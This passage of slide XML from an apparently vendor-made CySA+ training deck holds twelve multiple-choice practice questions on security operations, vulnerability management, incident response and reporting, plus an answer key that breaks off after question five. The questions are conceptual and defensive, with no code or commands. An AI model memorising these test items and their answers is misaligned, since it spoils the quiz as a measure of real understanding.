            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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TEST YOURSELF</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Practice Exam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Sharpen your exam readiness with the Tertiary Infotech CySA+ practice exam:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  https://exams.tertiaryinfotech.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Attempt it under timed conditions and review every explanation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Revisit any topic or lab you miss, then re-take the practice exam.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The following slides give you a warm-up practice quiz — answers at the end.</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892</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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PRACTICE EXAM · SECURITY OPERATIONS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Practice Question 1</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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst notices outbound DNS requests from a workstation to a domain with a very high entropy name, occurring every 60 seconds. What does this MOST likely indicate?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  Normal DNS prefetching by the browser</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Beaconing to a command-and-control server via DGA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  A misconfigured DNS forwarder</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  IPv6 neighbour discovery traffic</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893</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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PRACTICE EXAM · SECURITY OPERATIONS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Practice Question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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Which log source is MOST useful for determining whether a phishing email was delivered, opened, and which URL the user clicked?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  DHCP lease logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Email gateway and web proxy logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Kernel audit logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  Print server logs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894</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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PRACTICE EXAM · SECURITY OPERATIONS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Practice Question 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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst wants to hunt for adversary techniques rather than specific IoCs. Which resource maps adversary tactics and techniques for this purpose?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  CVSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  MITRE ATT&amp;CK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  CVE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  OWASP Top 10</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895</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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PRACTICE EXAM · VULNERABILITY MANAGEMENT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Practice Question 4</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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A vulnerability has CVSS vector AV:N/AC:L/PR:N/UI:N and a public exploit. The asset is an internet-facing payment server. What is the BEST prioritisation decision?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  Defer to the next quarterly patch cycle</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Remediate immediately as highest priority</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Accept the risk since compensating controls exist</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  Reclassify as informational</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896</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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PRACTICE EXAM · VULNERABILITY MANAGEMENT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Practice Question 5</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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Which scan type provides the MOST accurate view of missing patches on a Linux server with minimal network noise?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  Unauthenticated SYN scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Credentialed (authenticated) scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Banner grabbing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  Passive OS fingerprinting</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897</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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PRACTICE EXAM · VULNERABILITY MANAGEMENT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Practice Question 6</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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A web app returns database errors when a single quote is submitted in a form field. Which vulnerability should the analyst suspect FIRST?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  Cross-site request forgery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  SQL injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Directory traversal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  Buffer overflow</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898</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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PRACTICE EXAM · INCIDENT RESPONSE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Practice Question 7</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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  During containment of a ransomware outbreak, what should the analyst do FIRST to an infected but powered-on server that holds volatile evidence?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  Power it off immediately</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Capture a memory image, then isolate it from the network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Re-image the server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  Delete the suspicious binaries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899</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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PRACTICE EXAM · INCIDENT RESPONSE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Practice Question 8</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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In the Cyber Kill Chain, an attacker emailing a malicious PDF to a target is at which stage?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  Reconnaissance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Delivery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Installation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  Actions on objectives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900</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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PRACTICE EXAM · INCIDENT RESPONSE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Practice Question 9</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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Which document preserves the integrity of digital evidence by recording who handled it, when, and why?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  Chain of custody form</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Business impact analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Service level agreement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  Risk register</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901</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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PRACTICE EXAM · REPORTING &amp; COMMUNICATION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Practice Question 10</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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Which metric pair BEST demonstrates SOC detection and response improvement to executives over time?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  CPU utilisation and disk IOPS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Mean time to detect (MTTD) and mean time to respond (MTTR)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Number of firewall rules and VLANs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  Patch count per server</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902</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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PRACTICE EXAM · REPORTING &amp; COMMUNICATION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Practice Question 11</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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  After an incident is closed, which activity captures what worked, what failed, and the improvement actions?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  Tabletop exercise</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Lessons-learned review</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Penetration test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  Vulnerability rescan</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903</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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PRACTICE EXAM · REPORTING &amp; COMMUNICATION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Practice Question 12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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A vulnerability report for the board should lead with which content?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  A.  Raw scanner output for every host</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  B.  Risk-ranked summary of exposures and remediation status</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  C.  Full packet captures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  D.  A list of all CVE identifiers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904</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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PRACTICE EXAM</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Practice Quiz — Answer Key (1/2)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400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q1: B — Regular-interval requests to algorithmically generated domains are classic C2 beaconing behaviour.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q2: B — The email gateway shows delivery; the web proxy shows the click and destination URL.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q3: B — MITRE ATT&amp;CK catalogues adversary tactics, techniques and procedures used for behaviour-based hunting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q4: B — Network-exploitable, no privileges/interaction needed, weaponised, on a critical exposed asset — top priority.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q5: B — Credentialed scans read package data directly from the host, reducing false positives and probe traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
